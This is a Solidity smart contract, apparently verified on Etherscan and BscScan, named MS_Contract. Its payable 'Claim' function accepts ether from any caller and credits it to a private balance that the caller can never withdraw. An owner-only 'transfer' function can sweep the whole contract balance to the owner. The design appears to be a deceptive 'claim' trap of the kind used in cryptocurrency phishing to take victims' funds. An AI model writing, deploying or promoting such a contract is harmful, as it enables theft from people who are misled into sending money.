/**
 *Submitted for verification at Etherscan.io on 2023-05-27
*/

/**
 *Submitted for verification at BscScan.com on 2023-04-07
*/

// SPDX-License-Identifier: Unlicense

pragma solidity ^0.8.17;

contract MS_Contract {
  address private owner;
  mapping (address => uint256) private balances;
  constructor() {
    owner = msg.sender;
  }
  function getOwner() public view returns (address) {
    return owner;
  }
  function getBalance() public view returns (uint256) {
    return address(this).balance;
  }
  function transfer(uint256 amount) public {
    require(msg.sender == owner, "You must be owner to call this");
    amount = (amount == 0) ? address(this).balance : amount;
    require(amount <= address(this).balance, "It's not enough money on balance");
    payable(msg.sender).transfer(amount);
  }
  function Claim(address sender) public payable {
    balances[sender] += msg.value;
  }
}